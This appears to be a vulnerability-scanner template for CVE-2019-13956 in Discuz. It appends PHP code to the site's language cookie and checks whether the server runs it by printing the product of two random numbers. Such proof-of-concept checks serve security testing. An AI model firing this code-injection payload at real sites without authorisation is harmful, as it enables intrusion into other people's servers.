name: poc-yaml-discuz-cve-2019-13956-rce
binding: 09305cd9-e8ca-4972-99aa-8e6902153c40
manual: true
detail:
    author: mennali
    links:
        - https://www.cnblogs.com/yuzly/p/11386755.html
    vulnerability:
        id: CT-78087
        level: critical
transport: http
set:
    s1: randomInt(1000, 9999)
    s2: randomInt(1000, 9999)
rules:
    r0:
        request:
            cache: false
            method: GET
            path: /
        expression: response.status == 200 && response.body.bcontains(b"language")
        output:
            search: '"Set-Cookie: (?P<test>.+?_[0-9]*_language=..)".bsubmatch(response.raw)'
            test: search["test"]
            abc: test + "'.print(" + string(s1) + "*" + string(s2) + ").'"
    r1:
        request:
            cache: false
            method: GET
            path: /
            headers:
                Cookie: '{{abc}}'
        expression: response.status == 200 && response.body.bstartsWith(bytes(string(s1 * s2) + "_1_1_common_header_forum_index.tpl.php"))
expression: r0() && r1()
